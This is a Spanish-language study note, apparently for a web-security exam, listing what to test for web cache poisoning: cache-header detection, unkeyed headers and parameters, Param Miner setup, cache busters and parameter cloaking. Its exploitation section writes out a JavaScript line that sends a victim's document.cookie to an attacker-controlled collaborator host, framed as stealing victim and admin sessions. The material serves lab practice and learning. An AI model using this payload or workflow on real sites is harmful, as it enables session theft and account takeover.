---
aliases:
  - to-do WCP
  - web cache poisoning to-do
tags:
  - exam/to-do
  - vuln/web-cache-poisoning
---

# Web Cache Poisoning — Qué probar en el examen

> **Fuente única** para los 3 stages (evita duplicar). Cada STAGE linkea acá.
> Técnica completa → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]] · labs → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs]] · ejemplos → carpeta `examples/`.

## 🚩 Flags — ¿vale la pena probar?

> La **señal de detección es la misma en todos los stages**: **headers de caché** en la respuesta (sobre todo de un `.js`/la home).
> - **`X-Cache: hit`/`miss`** (y `X-Cache-Hits`, `Cache-Status`) → vino de caché.
> - **`Age`**, **`Cache-Control`** (`public`, `max-age`), **`Vary`**, **`Expires`** → qué y cuánto se cachea.
> - Que alterne **`miss`→`hit`** = hay algo que envenenar.
> - *(recon)* `Pragma: x-get-cache-key` / Akamai `akamai-x-get-cache-key` → devuelve **`X-Cache-Key`** = qué es keyed vs unkeyed.

> [!tip] 🎯 Gadgets que gritan WCP (dónde suele haber reflejo cacheable)
> - **Idioma en la URL** (`/en`, `/es`, `?lang=`) → contenido **localizado**, cacheado y a menudo con params reflejados / `Vary: Accept-Language`.
> - **Scripts que llaman un callback** (geolocalización tipo `geolocate.js` → `setCountryCookie(...)`) → candidato a **parameter cloaking**: pisás el **nombre del callback** por `alert(1)` → [[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009]].
> - `<script src>`/`@import` cuyo host o query **refleja** un header/param controlable.

### Stage 1
- Los headers de caché de arriba **+ hay víctimas navegando** (alguien que reciba el payload).

### Stage 2
- Los headers de caché de arriba **+ el admin navega** (la home) → **su sesión es el premio**.

## 🧪 Cosas a probar (lo que cambia por stage = el objetivo)

### Stage 1 — robar la sesión de una víctima
- [ ] Envenenar la **home** (o un `.js`) para que **cualquiera que visite** reciba **mi JS** → exfil de su cookie → **entrar a su cuenta**.

### Stage 2 — escalar robando al admin
- [ ] **Mismo ataque apuntando al admin** (pasa por la home) → robo de su sesión = **escalada**.
- [ ] **Targeting:** si `User-Agent` (u otro header) está en `Vary` = keyed → **replicá el del admin** para envenenar **SU** copia (lab *targeted, unknown header*).

## ♾️ Independiente del stage (el "cómo" — sirve para los dos)

### 1) Detección / cache oracle
Ver los **headers de caché** del bloque de Flags. Confirmá `miss`→`hit` y, si podés, mirá la key con `Pragma: x-get-cache-key` → [[vulnerabilities/030-web-cache-poisoning/examples/005-ver-cache-key-akamai|005]].

### 2) Encontrar el input unkeyed (el vector)
| Input | ¿Unkeyed? | Rol |
| --- | --- | --- |
| `X-Forwarded-Host` | Sí (clásico) | **Vector rey** — reflejado en `<script src>`/import |
| `X-Forwarded-Scheme` / `-Proto` | Suele | **Gatillo** (fuerza redirect) → se combina con XFH |
| `Cookie` | A veces | Vector solo si esa cookie es unkeyed (lab 2) |
| `User-Agent` | Casi siempre **keyed** (`Vary`) | No es vector → sirve para **targetear** a la víctima |
| `utm_content` (param) | Sí | Vector — los CDN lo excluyen a propósito |
| **puerto** del `Host` | Sí | Pisa reflexiones (`Location`) → [[vulnerabilities/030-web-cache-poisoning/examples/006-unkeyed-port|006]] |

### 3) Cómo usar Param Miner
1. Instalar del **BApp Store**.
2. Click derecho en la request → **Extensions → Param Miner → Guess headers** (o *Guess GET/POST params* / *Guess cookies*).
3. **Imprescindible para caché:** activar **"Add static/dynamic cache buster"** e **"Include cache busters in headers"** → cada prueba usa una entrada fresca y no te engaña el hit.
4. Manda cada candidato con un **valor canario** y marca los que **se reflejan**. Trae wordlist propia y halla headers **secretos** (el lab del *unknown header*).
5. **Verificás a mano:** que el input **cambie la respuesta** Y **no entre en la key** (`X-Cache: hit` o `X-Cache-Key`).

### 4) Cache buster (probar sin esperar ni ensuciar)
Headers keyed inofensivos: `Accept-Encoding: gzip, deflate, cachebuster` · `Accept: */*, text/cachebuster` · `Cookie: cachebuster=1` · `Origin: https://cachebuster.vulnerable-website.com`. ⚠️ **Quitarlo al atacar** → [[vulnerabilities/030-web-cache-poisoning/examples/007-unkeyed-query-string-cachebuster|007]].

### 5) Explotar
Hosteo en el **exploit server** el JS que la página envenenada importa, en el **path exacto**:
- Solve: `alert(document.cookie)`.
- Real: `new Image().src='//TU-collab/?c='+document.cookie;` → capturo la cookie → entro a la cuenta.
Luego **cacheo** (sin buster) y confirmo `X-Cache: hit` en la request limpia.

### 6) Bypassear la codificación del navegador (probar desde Repeater)
El browser **URL-encodea** solo `;`, `<`, `>`, comillas y espacios → desde el **Repeater** mandás los **bytes crudos** y llegás al gadget con el payload **literal** (por eso el testing de WCP se hace en Burp, no en el navegador).
- **Cloak con `;`:** ⚠️ **NO "ignora todo lo que sigue"** siempre — es una **discrepancia de parseo**: el **caché** suele tratar lo que va tras `;` como **parte del param excluido** (no lo keyea), y el **backend** (p. ej. Rails) lo **separa** como parámetro nuevo y le da **precedencia al último**. Hay parsers que sí truncan en `;`. → **probá ambos comportamientos** ([[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009]]).
- ⚠️ **Cuidado con la key:** si el caché **keyea la forma codificada**, tu payload crudo (Repeater) puede **no coincidir** con lo que manda la **víctima** (que va encodeado por el browser) → mirá **normalized cache keys** en el [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]] y confirmá con `X-Cache-Key`.

### 7) Referencias
- 📁 Entry point → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|web-cache-poisoning]]
- 🧪 Labs → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs/README]]
- 📎 Ejemplos → `001`–`011` (design flaws, recon, implementation flaws)
- 🔗 Host header → carpeta `vulnerabilities/016-host-header-injection/`
